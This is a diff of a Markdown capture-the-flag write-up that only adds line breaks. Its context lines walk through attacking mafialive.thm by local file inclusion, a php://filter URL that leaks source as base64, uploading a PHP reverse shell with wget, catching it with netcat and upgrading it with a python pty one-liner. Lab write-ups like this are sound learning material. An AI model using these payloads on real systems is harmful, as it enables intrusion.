@@ -39,6 +39,7 @@ Though we're in a CTF, we can click the test button without problems. In a real 
 
 Let's click that button.
 ![](https://github.com/user-attachments/assets/6053ba40-f5d6-4ed3-aaeb-6fa62227d2a9)
+
 Now we're in `http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`
 
 
@@ -59,7 +60,8 @@ We've succesfully exploited LFI. Let's inject the code in the URL to exfiltrate 
 
 Let's try a php filter to exfiltrate data:
 `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`
-![](https://github.com/user-attachments/assets/e75944cf-5cdb-4f47-a885-cd450a3b8f94)Now we have the phrase "Control is an illusion" written in base64.
+![](https://github.com/user-attachments/assets/e75944cf-5cdb-4f47-a885-cd450a3b8f94)
+Now we have the phrase "Control is an illusion" written in base64.
 
 
 
@@ -100,6 +102,7 @@ We can use it to upload a php reverse shell (`shell.php`) using wget and URL enc
 
 It's time to fire up netcat and visit `mafialive.thm/shell.php`
 ![](https://github.com/user-attachments/assets/73bd663a-6950-40c9-aa21-590e9f6c3166)
+
 And...we're in!
 `whoami: 
 `www-data`
@@ -109,6 +112,7 @@ Let's stabilize the shell:
 `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 `export TERM=xterm-color`
 ![](https://github.com/user-attachments/assets/0eaeae04-1ab0-4ddb-8edc-49a11dbf3061)
+
 Now we're ready to search for the third flag, the one of the first user (www-data).
 
 
